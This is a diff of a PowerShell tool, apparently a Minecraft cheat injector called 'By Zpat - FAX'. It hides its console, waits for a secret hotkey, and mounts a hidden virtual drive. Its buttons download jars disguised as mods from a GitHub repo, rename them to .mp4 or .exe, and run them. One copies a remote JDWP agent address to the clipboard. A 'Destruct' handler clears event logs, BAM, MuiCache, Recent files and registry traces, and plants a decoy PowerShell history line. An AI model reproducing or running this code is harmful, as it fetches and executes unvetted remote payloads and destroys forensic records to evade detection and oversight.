@@ -1,9 +1,472 @@
-# METHOD 1: Graceful form closure (Recommended)
-# Replace the last part of your Destruct button click handler with:
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
+# START OF KEY BUTTON DETECTION
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class User32 {
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
+}
+"@
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+
+# Hide console window
+try {
+    $consolePtr = [Win32]::GetConsoleWindow()
+    # 0 = SW_HIDE
+    [Win32]::ShowWindow($consolePtr, 0) | Out-Null
+} catch {
+    Write-Error "Failed to hide console window: $_"
+    exit 1
+}
+
+# Virtual key codes
+$VK_CONTROL = 0x11
+$VK_MENU = 0x12  # Alt key
+$VK_F11 = 0x7A
+
+# Inform user that the script is running and waiting for input
+Write-Host "Waiting for Ctrl + Alt + F11 to be pressed..."
+while ($true) {
+    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
+    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
+    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
+    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
+        break
+    }
+    Start-Sleep -Milliseconds 100
+}
+
+# Load System.Windows.Forms assembly
+try {
+    Add-Type -AssemblyName System.Windows.Forms
+} catch {
+    Write-Error "Failed to load System.Windows.Forms assembly: $_"
+    exit 1
+}
+# END OF KEY BUTTON DETECTION
+
+# Set preferences to run silently
+$ConfirmPreference = 'None'
+$ErrorActionPreference = 'SilentlyContinue'
+
+# SHOW LOADING SCREEN
+# Create a new form for loading screen
+$loadingForm = New-Object System.Windows.Forms.Form
+$loadingForm.Text = "Loading..."
+$loadingForm.Size = New-Object System.Drawing.Size(800, 300)
+$loadingForm.StartPosition = 'CenterScreen'
+$loadingForm.BackColor = 'Black'
+$loadingForm.FormBorderStyle = 'FixedDialog'
+$loadingForm.MaximizeBox = $false
+$loadingForm.MinimizeBox = $false
+
+# ASCII Art Label
+$asciiArt = @"
+   __   ____  ___   ___  _____  _______
+  / /  / __ \/ _ | / _ \/  _/ |/ / ___/
+ / /__/ /_/ / __ |/ // // //    / (_ / 
+/____/\____/_/ |_/____/___/_/|_/\___/
+"@
+$label = New-Object System.Windows.Forms.Label
+$label.Text = $asciiArt
+$label.Font = New-Object System.Drawing.Font("Consolas", 20)
+$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
+$label.AutoSize = $true
+$label.Location = New-Object System.Drawing.Point(50, 50)
+$loadingForm.Controls.Add($label)
+
+# Loading ProgressBar
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Minimum = 0
+$progressBar.Maximum = 100
+$progressBar.Value = 0
+$progressBar.Style = 'Continuous'
+$progressBar.Width = 700
+$progressBar.Location = New-Object System.Drawing.Point(50, 200)
+$progressBar.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
+$progressBar.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
+$loadingForm.Controls.Add($progressBar)
+
+# Show loading form
+$loadingForm.Show()
+
+# Start time
+$startTime = Get-Date
+
+# Duration in milliseconds
+$totalDuration = 4000  # 4 seconds
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 50  # Update every 50ms
+
+# Define timer tick action
+$timer.Add_Tick({
+    $elapsedTime = (Get-Date) - $startTime
+    $percentComplete = [math]::Min(100, ($elapsedTime.TotalMilliseconds / $totalDuration) * 100)
+    $progressBar.Value = $percentComplete
+
+    # Check for key press even while loading
+    $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
+    $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
+    $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
+
+    if ($ctrlPressed -and $altPressed -and $f11Pressed) {
+        $timer.Stop()
+        $progressBar.Value = 100
+        Start-Sleep -Milliseconds 200
+        $loadingForm.Close()
+    }
+
+    if ($percentComplete -ge 100) {
+        $timer.Stop()
+        Start-Sleep -Milliseconds 200
+        $loadingForm.Close()
+    }
+})
+
+# Start the timer
+$timer.Start()
+
+# Run the loading form on the UI thread
+[void]$loadingForm.ShowDialog()
+
+# Stop and dispose the timer
+$timer.Stop()
+$timer.Dispose()
+# END OF LOADING SCREEN
+
+# MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# Ensure the directory exists
+$vdiskPath = "C:\temp\ddr.vhd"
+$vdiskSizeMB = 2048 # Size of the virtual disk in MB (2 GB)
+# Step 1: Check if the virtual disk already exists and remove it if it does
+if (Test-Path -Path $vdiskPath) {
+  Remove-Item -Path $vdiskPath -Force
+}
+# Step 2: Create the virtual disk (expandable)
+$createVHDScript = @"
+create vdisk file=`"$vdiskPath`" maximum=$vdiskSizeMB type=expandable
+"@
+$scriptFileCreate = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
+$createVHDScript | Set-Content -Path $scriptFileCreate
+# Execute the diskpart command to create the virtual disk
+diskpart /s $scriptFileCreate
+# Step 3: Attach the virtual disk
+$attachVHDScript = @"
+select vdisk file=`"$vdiskPath`"
+attach vdisk
+"@
+$scriptFileAttach = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999)"
+$attachVHDScript | Set-Content -Path $scriptFileAttach
+# Execute the diskpart command to attach the virtual disk
+diskpart /s $scriptFileAttach
+# Step 4: Wait for the disk to be detected by the system
+Start-Sleep -Seconds 5  # Allow a moment for the disk to be registered by the OS
+# Retrieve the attached disk (assuming it's the last disk created)
+$disk = Get-Disk | Sort-Object -Property Number | Select-Object -Last 1
+# Check if the disk is offline, and set it online if needed
+if ($disk.IsOffline -eq $true) {
+    Set-Disk -Number $disk.Number -IsOffline $false
+}
+# Initialize the disk if it's in raw state (uninitialized)
+if ($disk.PartitionStyle -eq 'Raw') {
+    Initialize-Disk -Number $disk.Number -PartitionStyle MBR
+}
+# Step 5: Create a new partition and explicitly assign drive letter Z
+$partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z
+# Step 6: Format the volume with FAT32 and set label
+Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
+# END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Close the old form
+$loadingForm.Close()
+
+# Hide PowerShell console window
+Add-Type -Name Win -Namespace Console -MemberDefinition @'
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+'@
+$consolePtr = [Console.Win]::GetConsoleWindow()
+[Console.Win]::ShowWindow($consolePtr, 0)
+
+# Create the form
+$form = New-Object System.Windows.Forms.Form
+$form.Text = 'By Zpat - FAX'
+$form.Size = New-Object System.Drawing.Size(950, 400)
+$form.StartPosition = 'CenterScreen'
+$form.BackColor = 'Black'
+# Set background color to black and make the window non-resizable
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.BackColor = 'Black'  # Set background color of the form to black
+# Set the title to empty (remove the title)
+$form.Text = "By Zpat - FAX" 
+# Set the top bar (title bar) color to black
+$form.BackColor = 'Black'  # Set background color for the whole form
+$form.ForeColor = 'White'  # Set text color for the form content
+
+# ASCII Art Label
+$asciiArt = @"
+      ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
+      ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
+      ███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
+      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
+      ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
+      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
+"@
+$label = New-Object System.Windows.Forms.Label
+$label.Text = $asciiArt
+$label.Font = New-Object System.Drawing.Font('Courier New', 9)
+$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#eaff00")
+$label.AutoSize = $true
+$label.Location = New-Object System.Drawing.Point(50, 50)
+$form.Controls.Add($label)
+
+# Define Main Menu Buttons
+$injectButton = New-Object System.Windows.Forms.Button
+$injectButton.Text = 'Inject'
+$injectButton.Width = 100
+$injectButton.Height = 40
+$injectButton.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the button
+$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0f8353")
+$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+
+$destructButton = New-Object System.Windows.Forms.Button
+$destructButton.Text = 'Destruct'
+$destructButton.Width = 100
+$destructButton.Height = 40
+$destructButton.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the button
+$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
+$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+
+# Function to return to main menu
+function Show-MainMenu {
+    $form.Controls.Clear()
+    $form.Controls.Add($label)
+    $form.Controls.Add($injectButton)
+    $form.Controls.Add($destructButton)
+}
+
+# Path to the custom sound file on Z drive
+$soundFilePath = "Z:\a.wav"
+
+# Function to download the sound file
+function Download-SoundFile {
+    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"   # Replace with the actual URL of the sound file
+    try {
+        iwr -Uri $soundUrl -OutFile $soundFilePath
+    } catch {
+        Write-Error "Failed to download sound file: $_"
+        exit 1
+    }
+}
+
+# Inject Button Click: Show Prestige and Vape buttons
+$injectButton.Add_Click({
+    # Disable the form to prevent interaction
+    $form.Enabled = $false
+
+    # Download the sound file
+    Download-SoundFile
+
+    # Load the sound player
+    $player = New-Object System.Media.SoundPlayer
+    $player.SoundLocation = $soundFilePath
+
+    # Play the custom sound
+    $player.PlaySync()
+
+    # Re-enable the form after sound playback
+    $form.Enabled = $true
+    $form.Controls.Clear()
+    $form.Controls.Add($label)
+
+    # Back Button
+    $backButton = New-Object System.Windows.Forms.Button
+    $backButton.Text = 'Back'
+    $backButton.Width = 100
+    $backButton.Height = 40
+    $backButton.Location = New-Object System.Drawing.Point(800, 320)
+    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
+    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $backButton.Add_Click({ Show-MainMenu })
+
+    # Prestige Button
+    $prestigeButton = New-Object System.Windows.Forms.Button
+    $prestigeButton.Text = 'Prestige'
+    $prestigeButton.Width = 120
+    $prestigeButton.Height = 40
+    $prestigeButton.Location = New-Object System.Drawing.Point(350, 150)
+    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
+    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $prestigeButton.Add_Click({
+        if (-Not (Test-Path "Z:\meme.mp4")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-fabric-0.6.13+mc1.21.4.jar"  -OutFile "Z:\meme.mp4"
+        }
+        Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
+    })
+
+    # DoomsDay Button
+    $doomsdayButton = New-Object System.Windows.Forms.Button
+    $doomsdayButton.Text = 'DoomsDay'
+    $doomsdayButton.Width = 120
+    $doomsdayButton.Height = 40
+    $doomsdayButton.Location = New-Object System.Drawing.Point(475, 150)
+    $doomsdayButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
+    $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $doomsdayButton.Add_Click({
+        if (-Not (Test-Path "Z:\cat.mp4")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-extra/sodium-extra-fabric-0.6.1+mc1.21.4.jar"  -OutFile "Z:\cat.mp4"
+        }
+        Start-Process java -ArgumentList '-jar "Z:\cat.mp4"'
+    })
+
+    # VapeV4 Button
+    $vapev4Button = New-Object System.Windows.Forms.Button
+    $vapev4Button.Text = 'VapeV4'
+    $vapev4Button.Width = 120
+    $vapev4Button.Height = 40
+    $vapev4Button.Location = New-Object System.Drawing.Point(600, 150)
+    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
+    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $vapev4Button.Add_Click({
+        if (-Not (Test-Path "Z:\gentask.exe")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar"  -OutFile "Z:\gentask.exe"
+        }
+        Start-Process "Z:\gentask.exe"
+    })
+
+    # VapeLite Button
+    $vapeliteButton = New-Object System.Windows.Forms.Button
+    $vapeliteButton.Text = 'VapeLite'
+    $vapeliteButton.Width = 120
+    $vapeliteButton.Height = 40
+    $vapeliteButton.Location = New-Object System.Drawing.Point(412.5, 210)
+    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#00f1e1")
+    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
+    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $vapeliteButton.Add_Click({
+        if (-Not (Test-Path "Z:\ilasm.exe")) {
+            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar"  -OutFile "Z:\ilasm.exe"
+        }
+        Start-Process "Z:\ilasm.exe"
+    })
+
+    # Phantom Button
+    $phantomButton = New-Object System.Windows.Forms.Button
+    $phantomButton.Text = 'Phantom'
+    $phantomButton.Width = 120
+    $phantomButton.Height = 40
+    $phantomButton.Location = New-Object System.Drawing.Point(537.5, 210)
+    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
+    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
+    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
+    $phantomButton.Add_Click({
+        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
+        Set-Clipboard -Value $clipboardText
+    })
+
+    # Add buttons to form
+    $form.Controls.Add($prestigeButton)
+    $form.Controls.Add($doomsdayButton)
+    $form.Controls.Add($vapev4Button)
+    $form.Controls.Add($vapeliteButton)
+    $form.Controls.Add($phantomButton)
+    $form.Controls.Add($backButton)
+})
+
+# Destruct Button
 $destructButton.Add_Click({
-    # ... your existing destruct code ...
-    
+    # Path to the virtual disk
+    $vdiskPath = "C:\temp\ddr.vhd"
+    # STEP 1: Get the virtual disk's associated disk number
+    $diskNumber = $null
+    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
+    if ($diskList) {
+        $diskNumber = $diskList.Number
+    } else {
+        Write-Host "Virtual disk not found or not attached. Aborting destruction."
+        return
+    }
+    # STEP 2: Detach the virtual disk
+    $detachScript = @"
+select vdisk file="$vdiskPath"
+detach vdisk
+"@
+    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+    $detachScript | Set-Content -Path $detachFile
+    diskpart /s $detachFile | Out-Null
+    Remove-Item -Path $detachFile -Force
+    # STEP 3: Initialize the disk (if needed)
+    $initializeScript = @"
+select disk $diskNumber
+online disk
+convert mbr
+"@
+    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+    $initializeScript | Set-Content -Path $initFile
+    diskpart /s $initFile | Out-Null
+    Remove-Item -Path $initFile -Force
+    # STEP 4: Create partition and assign drive letter
+    $partitionScript = @"
+select disk $diskNumber
+create partition primary
+assign letter=Z
+"@
+    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+    $partitionScript | Set-Content -Path $partFile
+    diskpart /s $partFile | Out-Null
+    Remove-Item -Path $partFile -Force
+    # STEP 5: Delete the virtual disk file
+    if (Test-Path $vdiskPath) {
+        Remove-Item -Path $vdiskPath -Force
+    }
+    # STEP 6: Clean up "Recent" shortcuts
+    $recentPath = [Environment]::GetFolderPath("Recent")
+    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
+        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
+    }
+    # Destruct other stuff after disk is gone
+    Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
+    Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
+    # Clear Temp
+    Remove-Item -Path "C:\temp\*" -Recurse -Force
+    Stop-Process -Name vds -Force
+    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
+    # Event logs
+    Clear-EventLog -LogName System
+    wevtutil cl "Windows PowerShell"
+    # Remove Stuff from MuiCache
+    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
+    ForEach-Object { $_.PSObject.Properties } |
+    Where-Object { $_.Name -like "Z:\*" } |
+    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
+    # BAM
+    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
+    # Conhost History
+    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1   | iex'
     # Clear JVM args logs and traces by clearing content
     $jvmLogFiles = @(
         "$env:USERPROFILE\.java\deployment\log\*.log",
@@ -16,134 +479,14 @@ $destructButton.Add_Click({
             Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
         }
     }
-    
-    # METHOD 1: Close the form gracefully
-    $form.Close()
-    $form.Dispose()
-})
-
-# ===================================
-
-# METHOD 2: Add a timer for delayed closure
-# Add this near the top of your script after creating the form:
-
-$closeTimer = New-Object System.Windows.Forms.Timer
-$closeTimer.Interval = 1000  # 1 second delay
-$closeTimer.Add_Tick({
-    $closeTimer.Stop()
-    $form.Close()
-    $form.Dispose()
-    [System.Windows.Forms.Application]::Exit()
-})
-
-# Then in your destruct button, replace the Stop-Process line with:
-# $closeTimer.Start()
-
-# ===================================
-
-# METHOD 3: Complete replacement for the destruct button handler
-$destructButton.Add_Click({
-    # Disable the button to prevent multiple clicks
-    $destructButton.Enabled = $false
-    
-    # Your existing destruct code here...
-    $vdiskPath = "C:\temp\ddr.vhd"
-    $diskNumber = $null
-    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
-    if ($diskList) {
-        $diskNumber = $diskList.Number
-    } else {
-        Write-Host "Virtual disk not found or not attached. Aborting destruction."
-        $form.Close()
-        return
-    }
-    
-    # Detach the virtual disk
-    $detachScript = @"
-select vdisk file="$vdiskPath"
-detach vdisk
-"@
-    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-    $detachScript | Set-Content -Path $detachFile
-    diskpart /s $detachFile | Out-Null
-    Remove-Item -Path $detachFile -Force
-    
-    # Initialize the disk
-    $initializeScript = @"
-select disk $diskNumber
-online disk
-convert mbr
-"@
-    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-    $initializeScript | Set-Content -Path $initFile
-    diskpart /s $initFile | Out-Null
-    Remove-Item -Path $initFile -Force
-    
-    # Create partition and assign drive letter
-    $partitionScript = @"
-select disk $diskNumber
-create partition primary
-assign letter=Z
-"@
-    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-    $partitionScript | Set-Content -Path $partFile
-    diskpart /s $partFile | Out-Null
-    Remove-Item -Path $partFile -Force
-    
-    # Delete the virtual disk file
-    if (Test-Path $vdiskPath) {
-        Remove-Item -Path $vdiskPath -Force
-    }
-    
-    # Clean up "Recent" shortcuts
-    $recentPath = [Environment]::GetFolderPath("Recent")
-    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
-        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
-    }
-    
-    # Destruct other stuff
-    Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
-    Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force -ErrorAction SilentlyContinue
-    
-    # Clear Temp
-    Remove-Item -Path "C:\temp\*" -Recurse -Force -ErrorAction SilentlyContinue
-    Stop-Process -Name vds -Force -ErrorAction SilentlyContinue
-    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force -ErrorAction SilentlyContinue
-    
-    # Event logs
-    Clear-EventLog -LogName System -ErrorAction SilentlyContinue
-    wevtutil cl "Windows PowerShell" 2>$null
-    
-    # Remove Stuff from MuiCache
-    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache -ErrorAction SilentlyContinue |
-    ForEach-Object { $_.PSObject.Properties } |
-    Where-Object { $_.Name -like "Z:\*" } |
-    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name -ErrorAction SilentlyContinue }
-    
-    # BAM
-    Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -ErrorAction SilentlyContinue | 
-    ForEach-Object { $_.PSObject.Properties } | 
-    Where-Object { $_.Name -match "mmc\.exe|diskpart\.exe" } | 
-    ForEach-Object { Remove-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -Name $_.Name -ErrorAction SilentlyContinue }
-    
-    # Conhost History
-    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1   | iex' -ErrorAction SilentlyContinue
-    
-    # Clear JVM logs
-    $jvmLogFiles = @(
-        "$env:USERPROFILE\.java\deployment\log\*.log",
-        "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
-        "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
-        "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log"
-    )
-    foreach ($file in $jvmLogFiles) {
-        Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
-            Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
-        }
-    }
-    
     # Gracefully close the application
     $form.Close()
     $form.Dispose()
     [System.Windows.Forms.Application]::Exit()
 })
+
+# Initial Load
+Show-MainMenu
+
+# Run the form
+[void]$form.ShowDialog()
